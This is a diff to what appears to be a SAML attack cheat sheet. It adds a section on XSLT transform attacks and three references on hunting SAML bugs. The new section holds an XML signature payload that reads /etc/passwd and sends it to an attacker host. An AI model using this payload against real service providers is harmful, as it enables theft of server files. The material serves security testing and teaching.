@@ -11,6 +11,7 @@
   * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
   * [XML Comment Handling](#xml-comment-handling)
   * [XML External Entity](#xml-external-entity)
+  * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
 
 ## Tools
 
@@ -155,6 +156,34 @@ In the following example:
 
 The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.
 
+
+### Extensible Stylesheet Language Transformation
+
+An XSLT can be carried out by using the `transform` element.
+
+![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)
+Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)    
+
+```xml
+<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+  ...
+    <ds:Transforms>
+      <ds:Transform>
+        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+          <xsl:template match="doc">
+            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
+            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
+            <xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
+            <xsl:variable name="exploitUrl"select="concat($attackerUrl,$escaped)"/>
+            <xsl:value-of select="unparsed-text($exploitUrl)"/>
+          </xsl:template>
+        </xsl:stylesheet>
+      </ds:Transform>
+    </ds:Transforms>
+  ...
+</ds:Signature>
+```
+
 ## References
 
 - [SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015](https://blog.compass-security.com/2015/07/saml-burp-extension/)
@@ -166,3 +195,6 @@ The SAML response is accepted by the service provider. Due to the vulnerability,
 - [ORACLE WEBLOGIC - MULTIPLE SAML VULNERABILITIES (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - Jul 18, 2018](https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)
 - [Truncation of SAML Attributes in Shibboleth 2 - 2018-01-15 - redteam-pentesting.de](https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)
 - [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - March 7th, 2017 - Jem Jensen](https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)
+- [How to Hunt Bugs in SAML; a Methodology - Part I - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
+- [How to Hunt Bugs in SAML; a Methodology - Part II - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)
+- [How to Hunt Bugs in SAML; a Methodology - Part III - @epi052](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
